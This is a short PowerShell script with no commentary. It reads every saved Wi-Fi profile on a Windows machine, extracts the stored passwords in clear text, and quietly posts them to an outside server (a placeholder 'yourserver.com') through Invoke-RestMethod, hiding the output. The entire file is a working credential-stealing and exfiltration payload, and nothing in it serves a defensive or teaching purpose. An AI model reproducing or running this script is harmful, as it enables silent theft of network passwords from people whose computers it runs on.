$output = ""
netsh wlan show profiles | Select-String -Pattern "All User Profile" | ForEach-Object { 
    $_ -match ": (.+)"
    $name=$Matches[1]
    $profileInfo = netsh wlan show profile name="$name" key=clear | Select-String -Pattern "Key Content"
    if ($profileInfo) { 
        $output += "Wi-Fi Profile: $name`nPassword: $($profileInfo -replace '\s+Key Content\s+:\s+','')`n--------------------------`n" 
    } 
}
$null = Invoke-RestMethod -Uri "https://yourserver.com" -Method Post -Body @{data=$output} *> $null
